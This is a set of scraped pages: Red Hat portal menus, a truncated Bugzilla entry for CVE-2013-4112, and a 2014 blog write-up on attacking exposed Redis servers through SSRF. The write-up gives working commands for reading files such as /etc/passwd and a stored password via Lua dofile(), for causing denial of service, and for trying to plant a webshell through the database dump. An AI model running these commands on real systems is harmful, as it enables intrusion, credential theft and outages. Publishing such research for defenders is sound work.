  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.redhat.com_006b50d2_20250126_100338.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.agarri.fr_b7bac53f_20250126_100341.html ===


* [Home](/en/index.html "Home page")
* [Company](/en/company.html "Company details")
* [Publications](/en/publications.html "Public interventions and published vulnerabilities")
* [Trainings](/en/trainings.html "Burp Suite Pro training")
* [Blog](/blog/ "Technical analysis and personnal opinions")
* [![fr](/images/fr.png)](/fr/ "French version")

[Main](https://www.agarri.fr/blog/index.html) >
[Archives](https://www.agarri.fr/blog/archives/index.html) >
[2014](https://www.agarri.fr/blog/archives/2014/index.html) >

[09](https://www.agarri.fr/blog/archives/2014/09/index.html) >

[<](https://www.agarri.fr/blog/archives/2013/11/27/compromising_an_unreachable_solr_server_with_cve-2013-6397/index.html)

10:35:56
[>](https://www.agarri.fr/blog/archives/2014/10/15/bypassing_blacklists_based_on_ipy/index.html)
## jeudi 11 septembre 2014, 10:35:56 (UTC+0200)

### Trying to hack Redis via HTTP requests

* Context

Imagine than you can access a Redis server via HTTP requests. It could be because of a SSRF vulnerability or a misconfigured proxy. In both situations, all you need is to fully control at least one line of the request. Which is pretty common in these scenarios ;-) Of course, the CLI client 'redis-cli' does not support HTTP proxying and we will need to forge our commands ourself, encapsulated in valid HTTP requests and sent via the proxy. Everything was tested under [version 2.6.0](http://code.google.com/p/redis/downloads/detail?name=redis-2.6.0.tar.gz). It's old, but that's what the target was using...

* Redis 101

[Redis](http://redis.io/) is NoSQL database, which stores everything in RAM as key/value pairs. By default, a text-oriented interface is reachable on port TCP/6379 without authentication. All you need to know right now is that the interface is very forgiving and will try to parse every provided input (until a timeout or the 'QUIT' command). It may only quietly complain via messages like "-ERR unknown command".

* Target identification

When exploiting a SSRF vulnerability or a misconfigured proxy, the first task is usually to scan for known services. As an attacker, I look for services bound to loopback only, using source-based authentication or just plain insecure "because they are not reachable from the outside". And I was quite happy to see these strings in my logs:

```

-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'

```

As you can see, the HTTP verb 'GET' is also a [valid](http://redis.io/commands/GET) Redis command, but the number of arguments do not match. And given no HTTP headers match a existing Redis command, there's a lot of "unknown command" error messages.

* Basic interaction

In my context, the requests were nearly fully controlled by myself and then emitted via a Squid proxy. That means that 1) the HTTP requests must be valid, in order to be processed by the proxy 2) the final requests reaching the Redis database may be somewhat normalized by the proxy. The easy way was to use the POST body, but injecting into HTTP headers was also a valid option. Now, just send a few basic commands (in blue):

```

ECHO HELLO
$5
HELLO

TIME
*2
$10
1410273409
$6
380112

CONFIG GET pidfile
*2
$7
pidfile
$18
/var/run/redis.pid

SET my_key my_value
+OK

GET my_key
$8
my_value

QUIT
+OK

```

* We need spaces!

As you may have already noted, the server responds with the expected data, plus some strings like "\*2" and "$7". This the binary-safe version of the [Redis protocol](http://redis.io/topics/protocol), and it is needed if you want to use a parameter including spaces. For example, the command 'SET my key "foo bar"' will never work, with or without single/double quotes. Luckily, the binary-safe version is quite straightforward:

- everything is separated with new lines (here CRLF)

- a command starts with '\*' and the number of arguments ("\*1" + CRLF)

- then we have the arguments, one by one:

   - string: the '$' character + the string size ("$4" + CRLF) + the string value ("TIME" + CRLF)

   - integer: the ':' character + the integer in ASCII (":42" + CRLF)

- and that's all!

Let's see an example, comparing the CLI client and the venerable 'netcat':

```

$ redis-cli -h 127.0.0.1 -p 6379 set with_space 'I am boring'
+OK

```
```

$ echo '*3\r\n$3\r\nSET\r\n$10\r\nwith_space\r\n$11\r\nI am boring\r\n' | nc -n -q 1 127.0.0.1 6379
+OK

```

* Reconnaissance

Now that we can easily discuss with the server, a recon phase is needed. A few Redis commands are helpful, like "INFO" and "CONFIG GET (dir|dbfilename|logfile|pidfile)". Here's the ouput of "INFO" on my test machine:

```

# Server
redis_version:2.6.0
redis_git_sha1:00000000
redis_git_dirty:0
redis_mode:standalone
os:Linux 3.2.0-61-generic-pae i686
arch_bits:32
multiplexing_api:epoll
gcc_version:4.6.3
process_id:19114
run_id:5a29a860ccbe05b43dbe15c0674fb83df0449b25
tcp_port:6379
uptime_in_seconds:9806
uptime_in_days:0
lru_clock:518932

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:1
blocked_clients:0

# Memory
used_memory:661768
[...]

```

The next step is, of course, the file-system. Redis can execute Lua scripts (in a sandbox, more on that later) via the "EVAL" command. The sandbox allows the [dofile()](http://luatut.com/dofile.html) command (WHY???). It can be used to enumerate files and directories. No specific privilege is needed by Redis, so requesting /etc/shadow should give a "permission denied" error message:

```

EVAL dofile('/etc/passwd') 0
-ERR Error running script (call to f_afdc51b5f9e34eced5fae459fc1d856af181aaf1): /etc/passwd:1: function arguments expected near ':'

EVAL dofile('/etc/shadow') 0
-ERR Error running script (call to f_9882e931901da86df9ae164705931dde018552cb): cannot open /etc/shadow: Permission denied

EVAL dofile('/var/www/') 0
-ERR Error running script (call to f_8313d384df3ee98ed965706f61fc28dcffe81f23): cannot read /var/www/: Is a directory

EVAL dofile('/var/www/tmp_upload/') 0
-ERR Error running script (call to f_7acae0314580c07e65af001d53ccab85b9ad73b1): cannot open /var/www/tmp_upload/: No such file or directory

EVAL dofile('/home/ubuntu/.bashrc') 0
-ERR Error running script (call to f_274aea5728cae2627f7aac34e466835e7ec570d2): /home/ubuntu/.bashrc:2: unexpected symbol near '#'

```

If the Lua script is syntaxically invalid or attempts to set global variables, the error messages will leak some content of the target file:

```

EVAL dofile('/etc/issue') 0
-ERR Error running script (call to f_8a4872e08ffe0c2c5eda1751de819afe587ef07a): /etc/issue:1: malformed number near '12.04.4'

EVAL dofile('/etc/lsb-release') 0
-ERR Error running script (call to f_d486d29ccf27cca592a28676eba9fa49c0a02f08): /etc/lsb-release:1: Script attempted to access unexisting global variable 'Ubuntu'

EVAL dofile('/etc/hosts') 0
-ERR Error running script (call to f_1c25ec3da3cade16a36d3873a44663df284f4f57): /etc/hosts:1: malformed number near '127.0.0.1'

```

Another scenario, probably not very common, is calling dofile() on valid Lua files and returning the variables defined there. Here's a hypothetic file /var/data/app/db.conf:

```

db = {
   login  = 'john.doe',
   passwd = 'Uber31337',
}

```

And a small Lua script dumping the password:

```

EVAL dofile('/var/data/app/db.conf');return(db.passwd); 0
+OK Uber31337

```

It works on some standard Unix files too:

```

EVAL dofile('/etc/environment');return(PATH); 0
+OK /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

EVAL dofile('/home/ubuntu/.selected_editor');return(SELECTED_EDITOR); 0
+OK /usr/bin/nano

```

* CPU theft

Redis provides redis.sha1hex(), which can be called from Lua scripts. So you can offload your SHA-1 cracking to open Redis servers. The code by [@adam\_baldwin](https://twitter.com/adam_baldwin) is on [GitHub](https://github.com/evilpacket/redis-sha-crack) and the slides on [Slideshare](http://fr.slideshare.net/evilpacket/ev1lsha-misadventures-in-the-land-of-lua).

* DoS

There's a lot of ways to DoS an open Redis instance, from deleting the data to calling the [SHUTDOWN](http://redis.io/commands/SHUTDOWN) command. However, here's two funny ones:

- calling dofile() without any parameter will read a Lua script from STDIN, which is the Redis console. So the server is still running but will not process new connections until "^D" is hit in the console (or a restart)

- sha1hex() can be overwritten (not only for you, but for every client). Using a static value is one of the options

The Lua script:

```

print(redis.sha1hex('secret'))
function redis.sha1hex (x)
   print('4242424242424242424242424242424242424242')
end
print(redis.sha1hex('secret'))

```

On the Redis console:

```

# First run
e5e9fa1ba31ecd1ae84f75caaa474f3a663f05f4
4242424242424242424242424242424242424242

# Next runs
4242424242424242424242424242424242424242
4242424242424242424242424242424242424242

```

* Data theft

If the Redis server happens to store interesting data (like session cookies or business data), you can enumerate stored pairs using [KEYS](http://redis.io/commands/KEYS) and then read their values with [GET](http://redis.io/commands/GET).

* Crypto

Lua scripts use fully predictable "random" numbers! Loot at evalGenericCommand() in scripting.c for details:

```

    /* We want the same PRNG sequence at every call so that our PRNG is
     * not affected by external state. */
    redisSrand48(0);

```

Every Lua script calling math.random() will get the same stream of numbers:

```

0.17082803611217
0.74990198051087
0.09637165539729
0.87046522734243
0.57730350670279
[...]

```

* RCE

In order to get remote code execution on an open Redis server, three scenarios were considered. The first one (proven but [highly complex](https://gist.github.com/corsix/6575486)) is related to byte-code modification and abuse of the internal VM machine. Not my cup of tea, I'm not a binary guy. The second one is escaping the globals protection and trying to access interesting functions (like during a CTF-like Python escape). Escaping the globals protection is trivial (and documented on [StackOverflow](http://stackoverflow.com/questions/19997647/script-attempted-to-create-global-variable)!). However, no interesting module is loaded at all, or my Lua skills suck (which is probable). By the way, there's plenty of interesting stuff [here](http://lua-users.org/wiki/SandBoxes).

Let's consider the third scenario, easy and realistic: dumping a semi-controlled file to disk, for example under the Web root and gain RCE through a webshell. Or overwriting a shell script. The only difference is the target filename and the payload, but the methodology is identical. It should be noted that the location of the log file can not be modified after startup. So the only solution is the database file itself. If you are paying attention enough, you should find suprising that a RAM-only database writes to disk. In fact, the database is copied to disk from times to times, for recovery purposes. The backup occurs depending on the configured thresholds, or when the [BGSAVE](http://redis.io/commands/bgsave) command is called.

The actions to take in order to drop a semi-controlled file are the followings:

- modify the location of the dump file

      CONFIG SET dir /var/www/uploads/

      CONFIG SET dbfilename sh.php

- insert your payload in the database

      SET payload "could be php or shell or whatever"

- dump the database to disk

      BGSAVE

- restore everything

      DEL payload

      CONFIG SET dir /var/redis/

      CONFIG SET dbfilename dump.rdb

And then, it's a big FAIL. Redis sets the mode of the dump file to "0600" (aka "-rw-------"). So Apache will not able to read it :-(

* Outro

Even if I wasn't able to execute my own code on this server, researching Redis was fun. And I learned a few tricks, which may be useful next week or later, you never know. Finally, thanks to people who published on Redis security: Francis Alexander, Peter Cawley and Adam Baldwin. And to the Facebook security team, which awarded 20K$ for a misconfigured proxy (the Redis instance was running on "noc.parse.com").

Posted by Nicolas GrÃ©goire
| [Permanent link](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)

[/\](#top)

### webmaster@agarri.fr Copyright 2010-2021 Agarri



=== Content from bugzilla.redhat.com_1116af95_20250126_100339.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D983489)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D983489)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D983489)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 983489

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 983489**](show_bug.cgi?id=983489)
(CVE-2013-4112)
- [CVE-2013-4112](https://access.redhat.com/security/cve/CVE-2013-4112) JGroups: Authentication via cached credentials

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2013-4112 JGroups: Authentication via cached credentials

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2013-4112 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed 